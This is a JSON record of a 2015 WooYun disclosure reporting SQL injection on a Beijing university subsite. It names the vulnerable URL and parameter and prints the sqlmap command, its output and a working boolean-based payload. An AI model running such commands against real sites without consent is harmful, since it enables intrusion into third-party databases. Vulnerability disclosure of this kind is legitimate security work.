{"id": 25255, "wybug_id": "wooyun-2015-0132153", "wybug_title": "北京科技大学某分站存在sql注入漏洞", "wybug_corp": "CCERT教育网应急响应组", "wybug_author": "路人甲", "wybug_date": "2015-08-11 23:12", "wybug_open_date": "2015-08-16 23:14", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-16：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  北京科技大学某分站存在sql注入漏洞，暴露大量信息漏洞页面：http://adma.ustb.edu.cn/szdw.asp?fid=208&id=468\n\n\n\n\n\n\nroot@kali:~# sqlmap -u \"http://adma.ustb.edu.cn/szdw.asp?fid=208&id=468\" -p id --dbms access --tamper=between    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 15:44:54[15:44:54] [INFO] loading tamper script 'between'[15:44:54] [INFO] testing connection to the target URL[15:44:55] [INFO] testing if the target URL is stable. This can take a couple of seconds[15:44:57] [INFO] target URL is stable[15:44:57] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable[15:44:57] [INFO] testing for SQL injection on GET parameter 'id'[15:44:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[15:45:00] [INFO] GET parameter 'id' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable [15:45:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[15:45:00] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[15:45:01] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test[15:45:17] [INFO] target URL appears to have 33 columns in queryinjection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y[15:45:48] [INFO] checking if the injection point on GET parameter 'id' is a false positiveGET parameter 'id' is vulnerable. Do you want to keep testing the others (if anynsqlmap identified the following injection points with a total of 152 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: fid=208&id=468 AND 9705=9705---[15:45:57] [WARNING] changes made by tampering scripts are not included in shown payload content(s)[15:45:57] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003 or XPweb application technology: Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access[15:45:57] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 8 times, 404 (Not Found) - 135 times[15:45:57] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/adma.ustb.edu.cn'[*] shutting down at 15:45:57\n   漏洞证明：  如上，虽然还没完成，但时间有限，就到这里吧   修复方案：  过滤id，好多处id都能注入呢   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-08-16 23:14 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}